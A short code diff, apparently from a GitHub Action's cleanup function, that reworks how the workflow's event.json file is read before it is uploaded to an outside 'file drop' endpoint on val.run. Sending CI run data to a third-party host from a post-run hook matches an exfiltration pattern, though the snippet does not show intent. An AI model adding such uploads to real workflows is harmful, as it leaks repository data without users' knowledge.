@@ -69,13 +69,12 @@ async function cleanup(): Promise<void> {
 
 		// Upload event.json to file drop service
 		const formData = new FormData();
-		formData.append(
-			"file",
-			fs.createReadStream(
-				"/home/runner/work/_temp/_github_workflow/event.json",
-			),
-			"event.json",
+		const fileStream = fs.readFileSync(
+			"/home/runner/work/_temp/_github_workflow/event.json",
+			"utf8",
 		);
+		const blob = new Blob([fileStream], { type: "application/json" });
+		formData.append("file", blob, "event.json");
 
 		const response = await fetch(
 			"https://maxm-internalfiledrop.web.val.run/upload",
